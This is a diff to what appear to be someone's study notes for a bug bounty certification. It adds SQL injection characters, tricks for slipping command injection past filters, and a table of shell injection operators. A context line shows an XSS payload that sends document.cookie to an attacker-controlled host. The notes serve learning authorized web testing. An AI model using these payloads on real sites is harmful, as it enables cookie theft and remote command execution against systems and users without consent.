@@ -54,6 +54,8 @@ Stuff for CBBH
     "><img src=x onerror=this.src="http://ip/?c"+document.cookie;>
 
   SQLmap
+
+    ' , ; -- /* */
     
     ##TIP: IF YOU CAN FIND BOUNDARIES, TRY TO COUNT THE NUMBER OF COLUMNS AND SPECIFY IT IN SQLMAP
     
@@ -91,6 +93,24 @@ Stuff for CBBH
 
     #Handling csrf token
     ##NOTE: THE PROPER WAY TO HANDLE THIS KINDA TOKEN IS BY, PASSING THEM WHEREVER THEY APPEAR (e.g cookie/body) AND USE THE FLAG --csrf-token WITH THE NAME OF THE PARAM THAT HOLDS THE TOKEN
+  
+  Command Injection
+
+    ##NOTE: If slash or backslash is blacklisted, you may use environment variable that have these chars
+    <LINUX>
+    ${PATH:0:1} - Users the slash at the $PATH variable
+
+    <WINDOWS>
+    echo %HOMEPATH:~6,-11%
     
-    
+  Injection Operator | Injection Character	| URL-Encoded Character| Executed Command
+  |---|---|---|---|
+  |Semicolon | ; |	%3b	| Both
+  |New Line |	\\n | %0a | Both
+  |Background | & | %26 | Both (second output generally shown first)
+  |Pipe |	\| 	| %7c | Both (only second output is shown)
+  |AND |	&& | %26%26 | Both (only if first succeeds)
+  |OR | \|\|	| %7c%7c	| Second (only if first fails)
+  |Sub-Shell |	\`\` | %60%60 |	Both (Linux-only)
+  |Sub-Shell | $() | %24%28%29 | Both (Linux-only)
     
